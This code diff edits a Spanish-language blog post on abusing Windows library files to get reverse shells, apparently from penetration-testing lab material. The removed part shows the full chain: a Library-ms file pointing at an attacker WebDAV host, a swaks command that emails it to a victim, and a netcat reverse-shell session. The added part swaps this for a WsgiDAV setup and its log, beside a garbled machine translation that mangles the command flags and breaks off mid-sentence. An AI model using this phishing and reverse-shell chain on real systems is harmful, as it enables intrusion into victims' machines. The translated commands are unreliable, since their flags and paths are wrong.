@@ -224,75 +224,30 @@ shell.interactive()
             title: 'Abusing Windows Library Files',
             date: 'January 14, 2025',
             content: `
-                <h2>Abusing Windows Library Files for Reverse Shells</h2>
-                <p>En esta sección, veremos cómo aprovechar los archivos de biblioteca de Windows y WsgiDAV para ejecutar un ataque del lado del cliente que da como resultado una reverse shell.</p>
+            A continuación, ejecutaremos WsgiDAV desde el **/inicio/kali/.local/bin** directorio. En el caso de que WsgiDAV se haya instalado mediante apt, la instalación el camino difiere y _WsgiDAV_ debe usarse como comando para iniciar el servidor durante todo el curso. El primer parámetro que proporcionaremos es **--anfitrión**, que especifica el host desde el que servir. vamos a escuchar todas las interfaces con **0.0.0.0**. A continuación, especificaremos la escucha. puerto con **--puerto=80** y deshabilitar la autenticación en nuestro recurso compartido con **--autenticación = anónimo**. Finalmente, configuraremos la raíz del directorio de nuestro WebDAV compartir con .
 
-                <h3>Configurando WsgiDAV</h3>
-                <p>Ejecutaremos WsgiDAV desde el directorio <code>/home/kali/.local/bin</code>. Usaremos los siguientes parámetros para configurarlo:</p>
-                <ul>
-                    <li><strong>--host:</strong> Especifica el host desde el que servir. Escucharemos en todas las interfaces con <code>0.0.0.0</code>.</li>
-                    <li><strong>--port:</strong> Especifica el puerto de escucha. Utilizaremos el puerto <code>80</code>.</li>
-                    <li><strong>--auth:</strong> Deshabilita la autenticación con <code>anonymous</code>.</li>
-                    <li><strong>--root:</strong> Configura la raíz del directorio para el recurso compartido WebDAV.</li>
-                </ul>
-                <div class="code-block">
-                <pre><code>
+```bash
 kali@kali:~$ mkdir /home/kali/webdav
+
 kali@kali:~$ touch /home/kali/webdav/test.txt
+
 kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
-                </code></pre>
-                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
-                </div>
-
-                <h3>Creando el Archivo de Biblioteca</h3>
-                <p>Usaremos Visual Studio Code para crear un archivo de biblioteca llamado <code>config.Library-ms</code>. Este archivo incluirá configuraciones XML específicas para apuntar al recurso compartido WebDAV.</p>
-                
-                <div class="code-block">
-                <pre><code>
-<?xml version="1.0" encoding="UTF-8"?>
-<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
-    <name>@windows.storage.dll,-34582</name>
-    <version>6</version>
-    <isLibraryPinned>true</isLibraryPinned>
-    <iconReference>imageres.dll,-1003</iconReference>
-    <templateInfo>
-        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
-    </templateInfo>
-    <searchConnectorDescriptionList>
-        <searchConnectorDescription>
-            <isDefaultSaveLocation>true</isDefaultSaveLocation>
-            <isSupported>false</isSupported>
-            <simpleLocation>
-                <url>http://192.168.119.2</url>
-            </simpleLocation>
-        </searchConnectorDescription>
-    </searchConnectorDescriptionList>
-</libraryDescription>
-                </code></pre>
-                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
-                </div>
-                <h3>Enviando el Archivo al Correo</h3>
-                <p>Podemos enviar este archivo como adjunto utilizando la herramienta <code>swaks</code>:</p>
-
-                <pre><code>
-sudo swaks -t dave.wizzard@supermagicorp.com --from test@supermagicorp.com 
---attach @config.Library-ms --server 192.168.132.199 --body @body.txt 
---header "Subject: Problem" --suppress-data -ap
-                </code></pre>
-                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
-
-                <p>Introduce las credenciales cuando se te solicite. Si todo se configura correctamente, la víctima ejecutará el archivo y se obtendrá una reverse shell.</p>
-
-                <h3>Ejemplo de Reverse Shell</h3>
-                <pre><code>
-kali@kali:~$ nc -nvlp 4444
-listening on [any] 4444 ...
-connect to [192.168.119.2] from (UNKNOWN) [192.168.50.194] 49768
-Windows PowerShell
-Copyright (C) Microsoft Corporation. All rights reserved.
-PS C:\Windows\System32\WindowsPowerShell\v1.0>
-                </code></pre>
-                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
+Running without configuration file.
+17:41:53.917 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
+17:41:53.919 - INFO    : WsgiDAV/4.0.1 Python/3.9.10 Linux-5.15.0-kali3-amd64-x86_64-with-glibc2.33
+17:41:53.919 - INFO    : Lock manager:      LockManager(LockStorageDict)
+17:41:53.919 - INFO    : Property manager:  None
+17:41:53.919 - INFO    : Domain controller: SimpleDomainController()
+17:41:53.919 - INFO    : Registered DAV providers by route:
+17:41:53.919 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/kali/.local/lib/python3.9/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
+17:41:53.919 - INFO    :   - '/': FilesystemProvider for path '/home/kali/webdav' (Read-Write) (anonymous)
+17:41:53.920 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
+17:41:53.920 - WARNING : Share '/' will allow anonymous write access.
+17:41:53.920 - WARNING : Share '/:dir_browser' will allow anonymous read access.
+17:41:54.348 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.5.2+ds1 Python 3.9.10
+17:41:54.348 - INFO    : Serving on http://0.0.0.0:80 ..
+```
+            
             `
         }
     ];
